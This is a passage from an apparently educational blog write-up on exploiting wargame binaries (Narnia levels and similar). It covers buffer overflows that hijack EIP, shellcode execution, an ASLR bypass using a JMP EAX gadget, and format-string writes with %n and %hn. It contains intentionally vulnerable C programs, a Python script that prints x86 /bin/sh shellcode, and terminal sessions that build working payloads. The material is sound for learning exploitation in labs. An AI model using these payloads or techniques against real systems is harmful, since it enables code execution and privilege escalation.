</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">)</span>
</span><span class='line'>        <span class="n">vuln</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
</span><span class='line'>    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure></li>

<li>Controlling the EIP:
In the below challenge, an attacker can use a buffer overflow to take control of the program&#8217;s execution. the return address for the call to vuln function is above buf on the stack, so it can be overwritten with an overflow. this allows an attacker to put nearly any address they desire in place of the return address. in this example, the goal is to call the give_shell function.
<ul>
<li>We need to find the address of give_shell function which can be done either by using gdb and print give_shell or objdump -d outputfile | grep give_shell.</li>
<li>To know the EIP offset, you can use cyclic patterns. Use  pattern_create.rb and pattern_offset.rb So pattern_create.rb 100 for instance will create a 100 byte cyclic pattern.</li>
<li>then you feed this as your input to the vulnerable program and it wil crash. so get the value of EIP at that point.</li>
<li>Then, we just need to pass the input to the program by ./a.out $(python -c &#8217; print &#8220;A&#8221; * Offset + &#8220;Address of give_shell in hex&#8221;&#8217; )</li>
</ul>
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class='C'><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="cm">/* This never gets called! */</span>
</span><span class='line'><span class="kt">void</span> <span class="nf">give_shell</span><span class="p">(){</span>
</span><span class='line'>    <span class="kt">gid_t</span> <span class="n">gid</span> <span class="o">=</span> <span class="n">getegid</span><span class="p">();</span>
</span><span class='line'>    <span class="n">setresgid</span><span class="p">(</span><span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">);</span>
</span><span class='line'>    <span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin/sh -i&quot;</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">void</span> <span class="nf">vuln</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">input</span><span class="p">){</span>
</span><span class='line'>    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
</span><span class='line'>    <span class="n">strcpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">input</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">)</span>
</span><span class='line'>        <span class="n">vuln</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
</span><span class='line'>    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure></li>
<li> Execute Me:
If you check the below code, getegid() function shall return the effective group ID of the calling process., setresuid() sets the real user ID, the effective user ID, and the saved set-user-ID of the calling process.

If you see, read function read the stdin into the buffer and (function_ptf) buf() function is called which would call anything in the buffer.
<ul>
<li>Since, buf will execute anything, we need a shell code to fit in 128 bytes, There are plenty of shellcode (with different platforms and different working)which can be found on <a href="http://shell-storm.org/shellcode/">Shell-Storm</a>.</li>
<li>Then, we just need to pass the input to the program by ./a.out $(python -c &#8217; print &#8220;A&#8221; * Offset + &#8220;Address of give_shell in hex&#8221;&#8217; )</li>
</ul>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class='C'><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="n">token</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="k">typedef</span> <span class="nf">void</span> <span class="p">(</span><span class="o">*</span><span class="n">function_ptr</span><span class="p">)();</span>
</span><span class='line'>
</span><span class='line'><span class="kt">void</span> <span class="nf">be_nice_to_people</span><span class="p">(){</span>
</span><span class='line'>    <span class="kt">gid_t</span> <span class="n">gid</span> <span class="o">=</span> <span class="n">getegid</span><span class="p">();</span>
</span><span class='line'>    <span class="n">setresgid</span><span class="p">(</span><span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>
</span><span class='line'>    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">be_nice_to_people</span><span class="p">();</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">128</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="p">((</span><span class="n">function_ptr</span><span class="p">)</span><span class="n">buf</span><span class="p">)();</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure></li>

<li> ROP1: This binary is running on a machine with ASLR! (Address space layout randomization (ASLR) is a computer security technique involved in protection from buffer overflow attacks.) Can you bypass it?

<ul>
<li>
From the code provided we can see that there’s a buffer overflow in the vuln() function due to the strcpy() call.  run the program within gdb and see what the state of the registers and the stack are at the time of the crash.
</li>
<li>From the cylic patterns tools, we could find that offset is at 76 which could be confirmed by providing a input of 76 “A”s and 4 “B”s to overwrite EIP. set a breakpoint after the call to strcpy(); that is *vuln+24. After the leave instruction is executed, EIP will be set to 0x424242.</li>
<li>EAX points to our buffer of “A”s and since the binary doesn’t have the NX bit, we can execute shellcode on the stack. To bypass ASLR, we just need to find an address that will do a JMP/CALL EAX and set that as our return address. msfelfscan can find a list of instructions to accomplish this:
</li>
<li>Since the binary is compiled for 32 bit, searching the shellcode in Shellstorm for Linux_x86 executing /bin/sh, we get 21 bytes shellcode by kernelpanic.</li>
<li> As EAX contains the 76*A + BBBB when the vuln function returns, we just need to find address which will execute JMP EAX, it can be found by msfelfscan -j eax binary_file</li>
<li>One more small but important observation is the number of NOPs, as our shellcode is 21 bytes and offset is 76 bytes and jmp is 4 bytes. So, 76 - 21 - 4 = 51.</li>
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='Python'><span class='line'><span class="kn">import</span> <span class="nn">struct</span>
</span><span class='line'><span class="n">code</span> <span class="o">=</span> <span class="s">&quot;</span><span class="se">\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80</span><span class="s">&quot;</span>
</span><span class='line'><span class="n">jmpeax</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;I&quot;</span><span class="p">,</span><span class="mh">0x080483e7</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;</span><span class="se">\x90</span><span class="s">&quot;</span><span class="o">*</span><span class="mi">51</span> <span class="o">+</span> <span class="n">code</span> <span class="o">+</span> <span class="n">jmpeax</span>
</span></code></pre></td></tr></table></div></figure>
</ul>
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class='C'><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">void</span> <span class="nf">be_nice_to_people</span><span class="p">(){</span>
</span><span class='line'>    <span class="kt">gid_t</span> <span class="n">gid</span> <span class="o">=</span> <span class="n">getegid</span><span class="p">();</span>
</span><span class='line'>    <span class="n">setresgid</span><span class="p">(</span><span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">void</span> <span class="nf">vuln</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">name</span><span class="p">){</span>
</span><span class='line'>    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
</span><span class='line'>    <span class="n">strcpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">name</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>
</span><span class='line'>    <span class="n">be_nice_to_people</span><span class="p">();</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">)</span>
</span><span class='line'>        <span class="n">vuln</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
</span><span class='line'>    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure></li>

</ol>


<h3>Format String Examples</h3>

<ol>

<li> Let&#8217;s see a simple example of a format string vulnerabilty. <strong>Narnia5</strong>
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class='C'><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">snprintf</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="k">sizeof</span> <span class="n">buffer</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
</span><span class='line'>  <span class="n">buffer</span><span class="p">[</span><span class="k">sizeof</span> <span class="p">(</span><span class="n">buffer</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Change i&#39;s value from 1 -&gt; 500. &quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">i</span><span class="o">==</span><span class="mi">500</span><span class="p">){</span>
</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;GOOD</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>      <span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin/sh&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;No way...let me give you a hint!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;buffer : [%s] (%d)</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">buffer</span><span class="p">));</span>
</span><span class='line'>  <span class="n">printf</span> <span class="p">(</span><span class="s">&quot;i = %d (%p)</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">i</span><span class="p">);</span>
</span><span class='line'>  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>
Let&#8217;s try to see what&#8217;s on stack and if we can put something on stack and change the value of i.
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>narnia5@melinda:~$ /narnia/narnia5 %08x.%08x.%08x.%08x.%08x.%08x 
</span><span class='line'>Change i's value from 1 -&gt; 500. No way...let me give you a hint!
</span><span class='line'>buffer : [f7eb6de6.ffffffff.ffffd6be.f7e2ebf8.62653766.36656436] (53)
</span><span class='line'>i = 1 (0xffffd6dc)
</span><span class='line'>narnia5@melinda:~$ /narnia/narnia5 %08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.
</span><span class='line'>Change i's value from 1 -&gt; 500. No way...let me give you a hint!
</span><span class='line'>buffer : [f7eb6de6.ffffffff.ffffd6ae.f7e2ebf8.62653766.36656436.6666662e.] (63)
</span><span class='line'>i = 1 (0xffffd6cc)
</span><span class='line'>narnia5@melinda:~$ /narnia/narnia5 %08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x 
</span><span class='line'>Change i's value from 1 -&gt; 500. No way...let me give you a hint!
</span><span class='line'>buffer : [f7eb6de6.ffffffff.ffffd6ae.f7e2ebf8.62653766.36656436.6666662e.] (63)
</span><span class='line'>i = 1 (0xffffd6cc)
</span><span class='line'>narnia5@melinda:~$ /narnia/narnia5 AAAA%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x
</span><span class='line'>Change i's value from 1 -&gt; 500. No way...let me give you a hint!
</span><span class='line'>buffer : [AAAAf7eb6de6.ffffffff.ffffd6ae.f7e2ebf8.41414141.62653766.36656] (63)
</span><span class='line'>i = 1 (0xffffd6cc)
</span><span class='line'>narnia5@melinda:~$ /narnia/narnia5 AAAA%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x
</span><span class='line'>Change i's value from 1 -&gt; 500. No way...let me give you a hint!
</span><span class='line'>buffer : [AAAAf7eb6de6.ffffffff.ffffd6ae.f7e2ebf8.41414141.62653766.36656] (63)
</span><span class='line'>i = 1 (0xffffd6cc)
</span><span class='line'>narnia5@melinda:~$ /narnia/narnia5 \xcc\xd6\xff\xff%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x
</span><span class='line'>Change i's value from 1 -&gt; 500. No way...let me give you a hint!
</span><span class='line'>buffer : [xccxd6xffxfff7eb6de6.ffffffff.ffffd69e.f7e2ebf8.78636378.667836] (63)
</span><span class='line'>i = 1 (0xffffd6bc)
</span><span class='line'>narnia5@melinda:~$ /narnia/narnia5 `python -c 'print "\xcc\xd6\xff\xff%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x"'`
</span><span class='line'>Change i's value from 1 -&gt; 500. No way...let me give you a hint!
</span><span class='line'>buffer : [����f7eb6de6.ffffffff.ffffd6ae.f7e2ebf8.ffffd6cc.62653766.36656] (63)
</span><span class='line'>i = 1 (0xffffd6cc)
</span><span class='line'>narnia5@melinda:~$ /narnia/narnia5 `python -c 'print "\xcc\xd6\xff\xff%08x.%08x.%08x.%08x.%08n.%08x.%08x.%08x"'`
</span><span class='line'>Change i's value from 1 -&gt; 500. No way...let me give you a hint!
</span><span class='line'>buffer : [����f7eb6de6.ffffffff.ffffd6ae.f7e2ebf8..62653766.36656436.6666] (63)
</span><span class='line'>i = 40 (0xffffd6cc)
</span><span class='line'>narnia5@melinda:~$ /narnia/narnia5 `python -c 'print "\xcc\xd6\xff\xff%08x.%08x.%08x.%08x.%108n.%08x.%08x.%08x"'`
</span><span class='line'>Change i's value from 1 -&gt; 500. No way...let me give you a hint!
</span><span class='line'>buffer : [����f7eb6de6.ffffffff.ffffd6ae.f7e2ebf8..62653766.36656436.6666] (63)
</span><span class='line'>i = 40 (0xffffd6cc)
</span><span class='line'>narnia5@melinda:~$ /narnia/narnia5 `python -c 'print "\xcc\xd6\xff\xff%08x.%08x.%08x.%08x.%108un.%08x.%08x.%08x"'`
</span><span class='line'>Change i's value from 1 -&gt; 500. No way...let me give you a hint!
</span><span class='line'>buffer : [����f7eb6de6.ffffffff.ffffd6ae.f7e2ebf8.                       ] (63)
</span><span class='line'>i = 1 (0xffffd6cc)
</span><span class='line'>narnia5@melinda:~$ /narnia/narnia5 `python -c 'print "\xcc\xd6\xff\xff%08x.%08x.%08x.%08x.%08n.%08x.%08x.%08x"'`
</span><span class='line'>Change i's value from 1 -&gt; 500. No way...let me give you a hint!
</span><span class='line'>buffer : [����f7eb6de6.ffffffff.ffffd6ae.f7e2ebf8..62653766.36656436.6666] (63)
</span><span class='line'>i = 40 (0xffffd6cc)
</span><span class='line'>narnia5@melinda:~$ /narnia/narnia5 `python -c 'print "\xcc\xd6\xff\xff%08x.%08x.%08x.%468x.%08n.%08x.%08x.%08x"'`
</span><span class='line'>Change i's value from 1 -&gt; 500. GOOD
</span><span class='line'>$ </span></code></pre></td></tr></table></div></figure>

</li>

<li>In this example, let&#8217;s see use of arbitary writing an address <strong>Narnia7</strong>
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>#include &lt;stdio.h&gt;
</span><span class='line'>#include &lt;stdlib.h&gt;
</span><span class='line'>#include &lt;string.h&gt;
</span><span class='line'>#include &lt;stdlib.h&gt;
</span><span class='line'>#include &lt;unistd.h&gt;
</span><span class='line'>
</span><span class='line'>int goodfunction();
</span><span class='line'>int hackedfunction();
</span><span class='line'>
</span><span class='line'>int vuln(const char *format){
</span><span class='line'>        char buffer[128];
</span><span class='line'>        int (*ptrf)();
</span><span class='line'>
</span><span class='line'>        memset(buffer, 0, sizeof(buffer));
</span><span class='line'>        printf("goodfunction() = %p\n", goodfunction);
</span><span class='line'>        printf("hackedfunction() = %p\n\n", hackedfunction);
</span><span class='line'>
</span><span class='line'>        ptrf = goodfunction;
</span><span class='line'>        printf("before : ptrf() = %p (%p)\n", ptrf, &ptrf);
</span><span class='line'>
</span><span class='line'>        printf("I guess you want to come to the hackedfunction...\n");
</span><span class='line'>        sleep(2);
</span><span class='line'>        ptrf = goodfunction;
</span><span class='line'>  
</span><span class='line'>        snprintf(buffer, sizeof buffer, format);
</span><span class='line'>
</span><span class='line'>        return ptrf();
</span><span class='line'>}
</span><span class='line'>
</span><span class='line'>int main(int argc, char **argv){
</span><span class='line'>        if (argc &lt;= 1){
</span><span class='line'>                fprintf(stderr, "Usage: %s &lt;buffer&gt;\n", argv[0]);
</span><span class='line'>                exit(-1);
</span><span class='line'>        }
</span><span class='line'>        exit(vuln(argv[1]));
</span><span class='line'>}
</span><span class='line'>
</span><span class='line'>int goodfunction(){
</span><span class='line'>        printf("Welcome to the goodfunction, but i said the Hackedfunction..\n");
</span><span class='line'>        fflush(stdout);
</span><span class='line'>        
</span><span class='line'>        return 0;
</span><span class='line'>}
</span><span class='line'>
</span><span class='line'>int hackedfunction(){
</span><span class='line'>        printf("Way to go!!!!");
</span><span class='line'>  fflush(stdout);
</span><span class='line'>        system("/bin/sh");
</span><span class='line'>
</span><span class='line'>        return 0;
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
If we see, the program provides us with the address of the ptrf pointer, goodfunction and bad function. The ptrf is assigned the address of goodfunction if we somehow change it to address of the badfunction, we can get a shell. Let&#8217;s run the program and see what are the address we get.
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>bitvijays@kali:~$ ./narnia71 A
</span><span class='line'>goodfunction() = 0x804871f
</span><span class='line'>hackedfunction() = 0x8048745
</span><span class='line'>
</span><span class='line'>before : ptrf() = 0x804871f (0xffb4450c)
</span><span class='line'>I guess you want to come to the hackedfunction...
</span><span class='line'>Welcome to the goodfunction, but i said the Hackedfunction..</span></code></pre></td></tr></table></div></figure>
and
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>narnia7@melinda:/narnia$ ./narnia7 A
</span><span class='line'>goodfunction() = 0x80486e0
</span><span class='line'>hackedfunction() = 0x8048706
</span><span class='line'>
</span><span class='line'>before : ptrf() = 0x80486e0 (0xffffd64c)
</span><span class='line'>I guess you want to come to the hackedfunction...
</span><span class='line'>Welcome to the goodfunction, but i said the Hackedfunction..</span></code></pre></td></tr></table></div></figure>
The reason I have added two running instances is because in the first instance the address is different by one byte 0x1f and 0x45 where as in the second instance the address differs by two bytes 0x86e0 and 0x8706. We can write two bytes by %hn and one byte by %hhn. We can write whole 4 byte address by following a formula 
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>If HOB &lt; LOB
</span><span class='line'>
</span><span class='line'>HOB:0x0804
</span><span class='line'>LOB:0x8706
</span><span class='line'>
</span><span class='line'>[addr+2][addr] = \x4e\xd6\xff\xff\x4c\xd6\xff\xff
</span><span class='line'>%.[HOB - 8]x   = 0x804 - 8 = 7FC (2044) = %.2044x
</span><span class='line'>%[offset]$hn   = %6\$hn
</span><span class='line'>%.[LOB - HOB]x = 0x8706 - 0x804 = 7F02 (32514) = %.32514x
</span><span class='line'>%[offset+1]$hn = %7\$hn
</span><span class='line'>
</span><span class='line'>`python -c 'print "\x4e\xd6\xff\xff\x4c\xd6\xff\xff" +"%.2044x%6\$hn %.32514x%7\$hn"'`</span></code></pre></td></tr></table></div></figure>

We also need to find the offset where the address is stored which can be done by two methods: Either compiling the program on local machine and checking the buffer just after snprintf
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>gdb-peda$ p buffer 
</span><span class='line'>$2 = "AAAA.000008a2.f7fdeb58.f7fde860.0804835c.0804871f.41414141.3030302e.61383030", '\000' &lt;repeats 51 times&gt;
</span></code></pre></td></tr></table></div></figure>
or by using ltrace 
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
